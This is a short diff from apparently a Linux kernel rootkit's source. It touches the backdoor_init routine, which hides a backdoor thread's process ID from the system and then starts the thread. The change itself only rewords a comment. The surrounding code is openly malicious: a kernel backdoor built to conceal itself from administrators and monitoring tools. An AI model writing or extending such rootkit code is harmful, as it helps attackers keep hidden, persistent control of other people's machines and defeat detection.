@@ -31,7 +31,7 @@ int __init backdoor_init(void){
 	}
 	if (hide_pid(backdoor_thread->pid) == -1){
 		printk(KERN_INFO "ROOTKIT: ERROR trying to hide backdoor thread\n");
-		// I don't know if I should stop it here as it has not been woken up
+		// I don't know if I should stop the thread here as it has not been woken up
 		return -1;
 	}
 	wake_up_process(backdoor_thread);
